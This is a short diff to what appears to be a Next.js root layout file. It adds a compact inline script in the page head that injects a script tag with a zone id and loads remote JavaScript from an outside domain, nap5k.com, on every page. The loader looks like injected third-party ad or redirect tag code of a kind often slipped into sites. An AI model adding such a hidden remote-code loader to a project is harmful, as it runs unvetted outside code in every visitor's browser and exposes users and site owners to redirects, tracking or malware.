@@ -74,6 +74,9 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+      <head>
+        <script>(function(s){s.dataset.zone='10718146',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+      </head>
       <body className="antialiased bg-white text-neutral-900 min-h-screen font-sans">
         {children}
         <ServiceWorkerRegistration />
